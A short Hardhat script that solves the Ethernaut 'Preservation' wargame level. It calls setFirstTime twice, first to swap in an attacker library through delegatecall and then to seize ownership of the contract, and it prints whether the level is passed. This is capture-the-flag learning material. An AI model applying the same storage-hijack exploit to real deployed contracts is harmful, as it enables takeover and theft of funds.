import { ethers } from "hardhat";

async function attackPreservation() {
    // change contract addresses here.
    const preservationAddress = "";
    const attackLibraryAddress = "";
    // change player address same as yyour player address in ethernauts
    const player = "";
    // no change here. attack starts here.
    const contract = await ethers.getContractAt("PreservationSample", preservationAddress);
    await contract.setFirstTime(attackLibraryAddress);
    await contract.setFirstTime(1);
    const owner = ((await contract.owner()) === player).toString();
    console.log(`Passed this level: ${owner}`);
}

attackPreservation()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
